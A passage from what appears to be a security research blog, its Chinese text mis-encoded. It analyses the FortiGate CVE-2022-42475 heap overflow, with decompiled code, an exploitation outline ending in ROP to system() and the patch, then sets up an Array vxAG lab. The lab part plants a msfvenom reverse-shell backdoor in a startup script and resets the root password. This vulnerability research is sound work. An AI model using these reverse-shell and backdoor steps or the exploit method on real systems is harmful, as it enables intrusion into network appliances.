class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v8 = *(v3 + <span class="number">16</span>) + v5;</span><br><span class="line">        *(v3 + <span class="number">16</span>) = v8;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &lt; content_length )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°è´Ÿè´£ä» POST è¯·æ±‚ä½“ä¸­è¯»å–è¾“å…¥ï¼Œå…¶åŸºæœ¬é€»è¾‘ï¼šé¦–å…ˆè·å–åˆ°ç”¨æˆ·æäº¤çš„ Content-Length å€¼ï¼Œä¼ å…¥ pool_alloc å‡½æ•°ä¸­åˆ†é…å†…å­˜ç©ºé—´ï¼Œä¹‹åä½¿ç”¨ memcpy å°†ç”¨æˆ·æ•°æ®æ‹·è´åˆ°åˆšåˆšåˆ†é…çš„å†…å­˜ä¸­ã€‚</p>
<p>é—®é¢˜å°±å‡ºåœ¨ pool_alloc å‚æ•°ä¸Šé¢ï¼ŒæŸ¥çœ‹æ±‡ç¼–æŒ‡ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     eax, [rax+18h]</span><br><span class="line">mov     rdi, [r12]</span><br><span class="line">lea     esi, [rax+1]</span><br><span class="line">movsxd  rsi, esi</span><br><span class="line">call    pool_alloc</span><br></pre></td></tr></table></figure></div>

<p>rax ä¸ºç”¨æˆ·è¯·æ±‚ç»“æ„ä½“æŒ‡é’ˆï¼Œåç§»ä½ç½® 0x18 å­˜æ”¾äº† CL å€¼ã€‚å…ˆå°† CL æ”¾åœ¨ eax å¯„å­˜å™¨ä¸­ï¼Œä½¿ç”¨ lea æŒ‡ä»¤å°†å…¶åŠ ä¸€åæ”¾åœ¨ esi å¯„å­˜å™¨ï¼Œå†ç”¨ movsxd æ‰©å±•ä¸º 64 bit å€¼ã€‚ç»“åˆè°ƒè¯•ä¿¡æ¯å°±å¯ä»¥çœ‹åˆ°ç¨‹åºä¸ºä½•å´©æºƒã€‚</p>
<p>åœ¨ fuzz è„šæœ¬ä¸­ä¼ å…¥ CL &#x3D; 2147483647ï¼Œæ¢æˆ hex ä¸º 0x7fffffffï¼Œç»è¿‡ä¸Šé¢çš„è¿ç®—å½“ä¼ å…¥ pool_alloc æ—¶å¯„å­˜å™¨æƒ…å†µï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-6.png"
                     
                ></p>
<p>pool_alloc å‡½æ•°çš„ä¼ªä»£ç :</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_164E590</span><span class="params">(__int64 a1, <span class="type">size_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a1 + <span class="number">8</span>);</span><br><span class="line">  v3 = v2[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">8LL</span> * (((a2 - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( &amp;v3[v4] &gt; *v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = dword_A8AC5A4 - <span class="number">25</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &lt; v4 )</span><br><span class="line">        v7 = <span class="number">8LL</span> * (((a2 - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>);</span><br><span class="line">      v8 = malloc_block(v7);</span><br><span class="line">      *(*(a1 + <span class="number">8</span>) + <span class="number">8LL</span>) = v8;</span><br><span class="line">      *(a1 + <span class="number">8</span>) = v8;</span><br><span class="line">      v3 = *(v8 + <span class="number">16</span>);</span><br><span class="line">      *(v8 + <span class="number">16</span>) = &amp;v3[v4];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2[<span class="number">2</span>] = &amp;v3[v4];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(v3, <span class="number">0</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¼ å…¥æ•°æ®å‚ä¸è¡¥é½è¿ç®—ï¼Œç„¶ååˆ¤æ–­åœ¨ v3 æ•°ç»„ä¸­å¯¹åº”ä½ç½®æ˜¯å¦å­˜åœ¨å†…å®¹ï¼Œä¸å­˜åœ¨åˆ™ç›´æ¥è°ƒç”¨ memset è¿”å›ï¼Œè€Œå½“è°ƒç”¨ memset æ—¶å‚æ•°æƒ…å†µï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-7.png"
                     
                ></p>
<p>length éƒ¨åˆ†å˜æˆä¸€ä¸ªéå¸¸å¤§çš„æ•°å€¼ï¼Œè¿™æ ·ä¼šå¯¼è‡´ memset è®¿é—®åˆ°éæ³•å†…å­˜ä½¿ç¨‹åºå´©æºƒã€‚</p>
<p>è€ƒå¯Ÿæ¼æ´æ ¹æœ¬åŸå› ï¼Œåœ¨è°ƒç”¨ pool_alloc å‡½æ•°æ—¶ä½¿ç”¨ 32 ä½æ•°å€¼ + 1 æ‹“å±•æˆ 64 ä½çš„æ–¹æ³•ï¼Œè¿™é‡Œå­˜åœ¨æ•´æ•°æº¢å‡ºã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ç‰¹æ®Šçš„ CL å€¼ï¼Œæ¯”å¦‚ 0x1b00000000ï¼Œç»è¿‡è¿ç®—æ‹“å±•ä¹‹åä¼šå˜æˆ 0x1ï¼Œåœ¨ pool_alloc å†…éƒ¨è°ƒç”¨ memset æ—¶æƒ…å†µï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-8.png"
                     
                ></p>
<p>ç¼“å†²åŒºæ˜¯ä½äº heap çš„ä¸€å—è¾ƒå°å†…å­˜ï¼Œè€Œ size å·²ç»å˜æˆ 0x1ã€‚</p>
<p>è¿™æ · pool_alloc è¿”å›äº†ä¸€å—è¾ƒå°çš„å †å†…å­˜ï¼Œå‡è®¾æ­¤æ—¶æˆ‘ä»¬åœ¨ POST è¯·æ±‚ä½“ä¸­æ„é€ äº†è¶…é•¿çš„æ•°æ®ï¼Œé‚£ä¹ˆåœ¨åç»­çš„ memcpy é˜¶æ®µå°±ä¼šå¯¼è‡´å †å†…å­˜æº¢å‡ºã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-9.png"
                     
                ></p>
<p>æŸäº›æƒ…å†µä¸‹èƒ½å¤Ÿå¾—åˆ°å¦‚ä¸‹ crash</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2022-42475-10.png"
                     
                ></p>
<h2 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h2><p>å¯¹äº FortiGate å †æº¢å‡ºçš„åˆ©ç”¨ï¼ŒDEVCORE æ›¾ä»‹ç»è¿‡æ€è·¯ï¼š<a class="link"   href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/" >https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ä¼ ç»Ÿå †æº¢å‡ºåˆ©ç”¨éœ€è¦ç»“åˆå †ç›¸å…³çš„ç®¡ç†é€»è¾‘ï¼Œé€šè¿‡ç²¾å¿ƒæ§åˆ¶å †å—æ’å¸ƒæ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚ä½†æ­£å¦‚ DEVCORE æ–‡ç« å’Œæˆ‘ä»¬ fuzz ç»“æœæ˜¾ç¤ºï¼Œåœ¨ FortiGate ä¸Šå †æº¢å‡ºä¼šè¦†ç›–å †ä¸­æŸäº›å…³é”®ç»“æ„ä½“ä¸­çš„æ•°æ®ï¼Œå…·ä½“æ¥è¯´æ˜¯ HTTP è¯·æ±‚çš„ SSL ç»“æ„ä½“æŒ‡é’ˆã€‚åœ¨è§¦å‘æ¼æ´ä¹‹å‰å…ˆå‘é€å¾ˆå¤šæ­£å¸¸çš„ HTTP è¯·æ±‚ï¼Œè¿™æ ·åœ¨å †ä¸­å°±ä¼šç•™ä¸‹å¾ˆå¤š SSL ç»“æ„ï¼Œå†è§¦å‘å †æº¢å‡ºå»è¦†ç›–è¿™äº›ç»“æ„ä½“ï¼Œå½“ç¨‹åºè°ƒç”¨è¢«è¦†ç›–çš„ç»“æ„ä½“ä¸­ handshake_func æŒ‡é’ˆæ—¶ï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥åŠ«æŒç¨‹åºæ§åˆ¶æµã€‚</p>
<p>è§‚å¯Ÿå´©æºƒç°åœºï¼Œrdx å¯„å­˜å™¨æŒ‡å‘å¯æ§å†…å­˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºä¸­æ‰¾åˆ° <code>push rdx ; pop rsp</code> çš„ gadgetï¼Œå°† stack è¿ç§»åˆ°å¯æ§å†…å­˜ä¸­ï¼Œå°†å †æº¢å‡ºè½¬æ¢æˆ ROPï¼Œç›´æ¥æ‰§è¡Œ system(â€˜cmdâ€™) å³å¯ã€‚</p>
<h2 id="è¡¥ä¸"><a href="#è¡¥ä¸" class="headerlink" title="è¡¥ä¸"></a>è¡¥ä¸</h2><p>æ–°ç‰ˆçš„ read_post_data è°ƒç”¨ pool_alloc æ—¶ä»£ç </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     rax, [rax+18h]</span><br><span class="line">mov     rdi, [r12]</span><br><span class="line">lea     rsi, [rax+1]</span><br><span class="line">call    pool_alloc</span><br></pre></td></tr></table></figure></div>

<p>ä¸å†ä½¿ç”¨ 32 ä½å¯„å­˜å™¨æ‹“å±•ï¼Œå¹¶ä¸”åˆ†é…å†…å­˜æ—¶ä¼šæ£€æŸ¥ size å¤§å°ã€‚</p>
<h2 id="å‚è€ƒæ–‡ç« -x2F-æ‹“å±•é˜…è¯»"><a href="#å‚è€ƒæ–‡ç« -x2F-æ‹“å±•é˜…è¯»" class="headerlink" title="å‚è€ƒæ–‡ç« &#x2F;æ‹“å±•é˜…è¯»"></a>å‚è€ƒæ–‡ç« &#x2F;æ‹“å±•é˜…è¯»</h2><p><a class="link"   href="https://www.cnblogs.com/studyskill/p/6524672.html" >FortiOS 5.4 åé—¨æ¤å…¥<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>DEVCORE å…³äº FortiGate å †æº¢å‡ºæ¼æ´åˆ©ç”¨çš„<a class="link"   href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/" >æ–‡ç« <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>2023 å¹´ 1 æœˆ 11 æ—¥ï¼ŒFortinet å®˜æ–¹å‘å¸ƒäº†å…³äºç§¯æåˆ©ç”¨è¯¥æ¼æ´çš„ç»„ç»‡ï¼Œä»¥åŠä»–ä»¬æ‰€ä½¿ç”¨å·¥å…·çš„<a class="link"   href="https://www.fortinet.com/blog/psirt-blogs/analysis-of-fg-ir-22-398-fortios-heap-based-buffer-overflow-in-sslvpnd" >åˆ†ææ–‡ç« <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>2023 å¹´ 5 æœˆ 17 æ—¥ï¼ŒBishopFox å‘å¸ƒäº†ä¸€ç§æ›´å®Œæ•´çš„åˆ©ç”¨æ­¤æ¼æ´çš„<a class="link"   href="https://bishopfox.com/blog/exploit-cve-2022-42475" >æ–‡ç« <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>Array Networks vxAG è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ (ä¸€)</title>
    <url>/2022/11/16/ArrayVPN_rce/</url>
    <content><![CDATA[<p>2022 å¹´ Array Networks å®˜æ–¹å‘å¸ƒäº†æ•°ä¸ªå½±å“ AG&#x2F;vxAG è®¾å¤‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å…¬å‘Šï¼Œå®˜æ–¹æŠ«éœ²ä¿¡æ¯è¾ƒå°‘ï¼Œéš¾ä»¥ç•Œå®šæœ¬æ–‡æåˆ°çš„æ¼æ´å’Œå…¬å‘Šä¸­çš„æ˜¯å¦ä¸€è‡´ï¼Œå› æ­¤æ–‡ç« å†…å®¹ä»…ä¾›å‚è€ƒã€‚ç”±äºç¯å¢ƒé…ç½®å’Œæ¼æ´åˆ†æåˆ©ç”¨è¾ƒä¸ºå¤æ‚ï¼Œæ‰€ä»¥æ–‡ç« å°†åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œæœ¬æ–‡ä¸ºç¬¬ä¸€éƒ¨åˆ†ã€‚(åˆ†æç‰ˆæœ¬åŸºäº 9.4.0.5)</p>
<span id="more"></span>

<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>é•œåƒä¸‹è½½é“¾æ¥ï¼š<a class="link"   href="https://support.arraynetworks.net/prx/001/http/supportportal.arraynetworks.net/vxag.html" >vxAG<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>å¾—åˆ°é•œåƒä¹‹åå¯¼å…¥ Vmware å¼€æœºï¼Œç­‰å¾…å¯åŠ¨å®Œæˆä¼šæç¤ºè¾“å…¥è´¦æˆ·ç™»å½•ï¼Œé»˜è®¤è´¦æˆ·ä¸º array:adminã€‚ç™»å½•åˆ° CLIï¼Œå…ˆé…ç½®ç½‘ç»œï¼Œç›¸å…³å‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable</span><br><span class="line">&lt;æç¤ºè¾“å…¥å¯†ç ï¼Œç›´æ¥å›è½¦&gt;</span><br><span class="line">configure terminal</span><br><span class="line">ip address port1 192.168.0.151 255.255.255.0</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></div>

<p>é…ç½®å¥½ä¹‹åæµè§ˆå™¨è®¿é—®é“¾æ¥ <a class="link"   href="https://192.168.0.151:8888/" >https://192.168.0.151:8888<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä½¿ç”¨é»˜è®¤è´¦æˆ·ç™»å½•å³å¯ã€‚</p>
<h2 id="ä»£ç å’Œæƒé™è·å–"><a href="#ä»£ç å’Œæƒé™è·å–" class="headerlink" title="ä»£ç å’Œæƒé™è·å–"></a>ä»£ç å’Œæƒé™è·å–</h2><p>ç½‘ç»œé…ç½®å®Œæ¯•ï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°æ–‡ä»¶ç³»ç»Ÿä»¥ä¾¿äºè¿›è¡Œä»£ç å®¡è®¡åˆ†æã€‚è·å–ä»£ç é‡‡ç”¨æ¯”è¾ƒå¸¸è§„çš„æ€è·¯ï¼Œå³å°è¯•å°†è™šæ‹Ÿæœºç£ç›˜æŒ‚è½½å‡ºæ¥ï¼Œæ‹·è´æ–‡ä»¶ç³»ç»Ÿæˆ–æ¤å…¥åé—¨ã€‚</p>
<p>å…ˆå…³é—­è™šæ‹Ÿæœºï¼Œå¸è½½ç£ç›˜ï¼Œç„¶åå°†ç£ç›˜æŒ‚è½½åˆ°å¦ä¸€å° Linux è™šæ‹Ÿæœºä¸Šï¼Œå¯ä»¥è¯†åˆ«åˆ°ä»¥ä¸‹åˆ†åŒº</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag_01.png"
                      alt="img"
                ></p>
<p>ä¸è¿‡å°è¯•ç‚¹å‡»åˆ†åŒºæ‰“å¼€æ—¶ï¼Œä¼šå‡ºç°é”™è¯¯ä¿¡æ¯ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag_02.png"
                      alt="img"
                ></p>
<p>è¿™æ˜¯å› ä¸º vxAG æ˜¯åŸºäº FreeBSD ç³»ç»Ÿå¼€å‘çš„ï¼ŒFreeBSD ä½¿ç”¨ UFS æ–‡ä»¶ç³»ç»Ÿï¼ŒLinux å¯¹ UFS çš„è¯†åˆ«å¯èƒ½å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæˆ‘ä»¬å°è¯•ç”¨ mount å‘½ä»¤æŒ‚è½½</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">sudo mount -r -t ufs -o ufstype=ufs2 /dev/sdb10 ./sdb10</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·å°±å¯ä»¥æŒ‚è½½æˆåŠŸï¼Œä¸šåŠ¡ç›¸å…³ç¨‹åºä½äº &#x2F;dev&#x2F;sdb7 ä¸­ï¼Œå…ˆå°†æ–‡ä»¶æ‰“åŒ…åˆ°æœ¬åœ°ã€‚</p>
<p>ç”±äºè®¾å¤‡ä¸æä¾› root shellï¼Œä¸ºäº†æ–¹ä¾¿åç»­è°ƒè¯•éœ€è¦åœ¨ç³»ç»Ÿä¸­æ¤å…¥åé—¨ï¼Œä¸è¿‡ç›´æ¥ä» Linux ä¸Šæ²¡åŠæ³•ä¿®æ”¹ UFS æ–‡ä»¶ç³»ç»Ÿï¼Œå¦‚æœæƒ³ä¿®æ”¹ï¼Œéœ€è¦å®‰è£…ä¸€ç³»åˆ—å·¥å…·å’Œå†…æ ¸é©±åŠ¨æ¨¡å—ï¼Œå…¶è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ä¸”å­˜åœ¨å¤±è´¥é£é™©ã€‚æˆ‘ä»¬å¯ä»¥é‡‡å–æ›´å¥½çš„æ–¹æ¡ˆï¼Œå®‰è£…ä¸€ä»½ FreeBSD ç³»ç»Ÿï¼Œå°†ç£ç›˜æŒ‚è½½åˆ°æ­¤ç³»ç»Ÿå³å¯è¿›è¡Œè¯»å†™æ“ä½œã€‚</p>
<p>FreeBSD 7.0 çš„ä¸‹è½½<a class="link"   href="http://ftp-archive.freebsd.org/pub/FreeBSD-Archive/old-releases/amd64/ISO-IMAGES/7.0/" >é“¾æ¥<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œä¸‹è½½ disc1 å³å¯ï¼Œå®‰è£…è¿‡ç¨‹å‚è€ƒ<a class="link"   href="https://wenku.baidu.com/view/c2b9c8adbfeb19e8b8f67c1cfad6195f312be8ca.html?_wkts_=1668560150325&bdQuery=freebsd+7.0+%E5%AE%89%E8%A3%85" >æ‰‹å†Œ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ã€‚</p>
<p>è¿›å…¥ FreeBSD ç³»ç»Ÿå…ˆä¿®æ”¹ &#x2F;etc&#x2F;ssh&#x2F;sshd_config é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ  PermitRootLogin yes é€‰é¡¹å…è®¸ root ç”¨æˆ·ç™»å½•ï¼Œå…³æœºå°†ç£ç›˜æŒ‚è½½ä¸Šå»ï¼Œå¼€æœºä» ssh ç™»å½•ã€‚æŒ‚è½½ç›®æ ‡ç£ç›˜æ—¶åº”ä½¿ç”¨ IDE ç±»å‹ã€‚</p>
<p>åœ¨ &#x2F;dev ç›®å½•ä¸‹å¯ä»¥çœ‹åˆ° ad0 è®¾å¤‡ï¼Œå¯¹åº”ç›®æ ‡ç¡¬ç›˜ã€‚æ–‡ä»¶ç³»ç»Ÿä½äº ad0s1e åˆ†åŒºä¸­ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å°†åˆ†åŒºæŒ‚è½½åˆ°æœ¬åœ°</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">fsck -y /dev/ad0s1e    <span class="comment"># é¦–å…ˆæ¸…ç†ç£ç›˜</span></span><br><span class="line">mount /dev/ad0s1e ./test     <span class="comment"># å°†ç£ç›˜æŒ‚è½½åˆ°æœ¬åœ°ç›®å½•</span></span><br></pre></td></tr></table></figure></div>

<p>æ¤å…¥åé—¨æ—¶æˆ‘ä»¬å¸Œæœ›å¯¹ç³»ç»Ÿçš„æ”¹åŠ¨æœ€å°ï¼Œä¸å½±å“æ­£å¸¸åŠŸèƒ½ï¼Œç»åˆ†æå‘ç°ä½äº &#x2F;ca&#x2F;bin ç›®å½•ä¸‹çš„ monitor.sh è„šæœ¬åœ¨æ‰§è¡Œ CLI å‘½ä»¤ debug monitor æ—¶ä¼šè¢«è°ƒç”¨ï¼Œå¯ä»¥è€ƒè™‘åœ¨è¿™ä¸ªè„šæœ¬å¼€å¤´åŠ å…¥ä¸€äº›åé—¨å‘½ä»¤ã€‚</p>
<p>åˆ©ç”¨ msf ç”Ÿæˆæœ¨é©¬æ–‡ä»¶</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p bsd/x64/shell_reverse_tcp LHOST=192.168.0.161 LPORT=12345 -f elf &gt; my_shell</span><br></pre></td></tr></table></figure></div>

<p>æŠŠæœ¨é©¬æ”¾åœ¨ &#x2F;ca&#x2F;bin ç›®å½•ä¸‹ï¼Œèµ‹äºˆ SUID æƒé™ï¼Œç„¶ååœ¨ monitor.sh å¼€å¤´æ·»åŠ å¯åŠ¨å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ca/bin/my_shell &amp;</span><br></pre></td></tr></table></figure></div>
<p>å¦å¤–ï¼Œå¯ä»¥å°† &#x2F;etc&#x2F;master.passwd ä¸­çš„ root å¯†ç ä¿®æ”¹æˆå·²çŸ¥çš„ï¼Œæ–¹ä¾¿åç»­æ“ä½œã€‚</p>
<p>ä¿å­˜ä¿®æ”¹å¸è½½ç£ç›˜ï¼Œå°†ç£ç›˜é‡æ–°æŒ‚è½½å› array ç³»ç»Ÿä¸Šï¼Œå¼€æœºè¿›å…¥ CLIï¼Œå…ˆåœ¨æ¥æ”¶ç«¯ç›‘å¬ç«¯å£ï¼Œç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable</span><br><span class="line">configure terminal</span><br><span class="line">debug monitor off</span><br><span class="line">debug monitor on</span><br></pre></td></tr></table></figure></div>

<p>åœ¨æ¥æ”¶ç«¯æ”¶åˆ°åå¼¹ shellï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag_03.png"
                      alt="img"
                ></p>
<p>åœ¨å‘½ä»¤è¡Œä¸­æ‰§è¡Œ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pw user mod array -g wheel</span><br></pre></td></tr></table></figure></div>

<p>å…è®¸ array ç”¨æˆ·ä½¿ç”¨ su åˆ‡æ¢ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /ca/bin/ca_shell /ca/bin/ca_shell_bak</span><br><span class="line">ln -s /bin/csh /ca/bin/ca_shell</span><br></pre></td></tr></table></figure></div>

<p>ä» ssh ä»¥ array ç”¨æˆ·èº«ä»½ç™»å½•ï¼Œå† su åˆ‡æ¢åˆ° root ç”¨æˆ·å³å¯å¾—åˆ°å®Œæ•´çš„ shell ç¯å¢ƒã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/array_vxag_04.png"
                      alt="img"
                ></p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æœ¬æ–‡è¦ä»‹ç»çš„æ¼æ´ä½äºè®¾å¤‡ DesktopDirect åŠŸèƒ½ä¸Šï¼Œæ ¹æ®å®˜æ–¹æè¿°ï¼Œè¿™æ˜¯ä¸€ä¸ªç±»ä¼¼ VPN çš„è¿œç¨‹æ¥å…¥åŠŸèƒ½ï¼Œå…è®¸ä¼ä¸šå‘˜å·¥åœ¨ä»»ä½•åœ°ç‚¹çš„ä»»ä½•è®¾å¤‡ä¸Šå®‰å…¨çš„æ¥å…¥å…¬å¸ç½‘ç»œã€‚è¿™ä¸ªåŠŸèƒ½é»˜è®¤è¿è¡Œåœ¨ TCP 9090 ç«¯å£ä¸Šï¼Œå¯¹åº”äºŒè¿›åˆ¶ç¨‹åº art_serverã€‚</p>
<p>art_server æ˜¯ä¸€ä¸ªåŸºäº lighttpd å¼€å‘çš„ web æœåŠ¡ç¨‹åºï¼Œå¯¹åº”é…ç½®æ–‡ä»¶ &#x2F;ca&#x2F;bin&#x2F;art_server.confï¼Œæˆ‘ä»¬ç›´æ¥å¯¹å®ƒé€†å‘åˆ†æã€‚</p>
<p>ç¨‹åºåŒ…å«ç¬¦å·ä¿¡æ¯ï¼ŒåŠ ä¸Š lighttpd æºç è¾…åŠ©å¯ä»¥å¿«é€Ÿå¯¹åŠŸèƒ½ç‚¹è¿›è¡Œå®šä½ï¼Œæˆ‘ä»¬æ‰¾åˆ°å…³é”®å…¥å£å‡½æ•° mod_art_server_uri_handlerï¼Œè¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®ç”¨æˆ·çš„è¯·æ±‚ URI è°ƒç”¨ä¸åŒåŠŸèƒ½ï¼ŒURI åŒ…æ‹¬</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/smx</span><br><span class="line">/prequery</span><br><span class="line">/query</span><br><span class="line">/object</span><br><span class="line">/portal</span><br><span class="line">/replication</span><br><span class="line">/test</span><br></pre></td></tr></table></figure></div>
<p>æ¯ä¸ª URI å¯¹åº”ä¸åŒå‡½æ•°ï¼Œå¤§éƒ¨åˆ†æ“ä½œéƒ½æ˜¯å¯¹æœ¬åœ° sqlite æ•°æ®åº“ &#x2F;ca&#x2F;bin&#x2F;artdb çš„å¢åˆ æ”¹æŸ¥ï¼Œä¸¾ä¾‹æ¥è¯´ï¼Œè·¯ç”± &#x2F;replication ä¸‹åŒ…å«å‡ ä¸ªå­è·¯ç”± &#x2F;groupinfoã€&#x2F;notificationã€&#x2F;join ç­‰ï¼Œå…¶ä¸­ &#x2F;groupinfo å¯¹åº”å‡½æ•° handle_replication_group_info_req çš„éƒ¨åˆ†ä»£ç ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">  xmlBuf = <span class="number">0LL</span>;</span><br><span class="line">  reqDoc = <span class="number">0LL</span>;</span><br><span class="line">  repDoc = <span class="number">0LL</span>;</span><br><span class="line">  db = <span class="number">0LL</span>;</span><br><span class="line">  peers = <span class="number">0LL</span>;</span><br><span class="line">  groupID = <span class="number">0LL</span>;</span><br><span class="line">  res = <span class="number">0LL</span>;</span><br><span class="line">  prmCon-&gt;http_status = <span class="number">500</span>;</span><br><span class="line">  data = get_post_content(prmData, prmServer, prmCon, <span class="number">1</span>);</span><br><span class="line">  reqDoc = xmlParseMemory(data-&gt;ptr, data-&gt;used);</span><br><span class="line">  <span class="keyword">if</span> ( !reqDoc )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to parse request (1)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  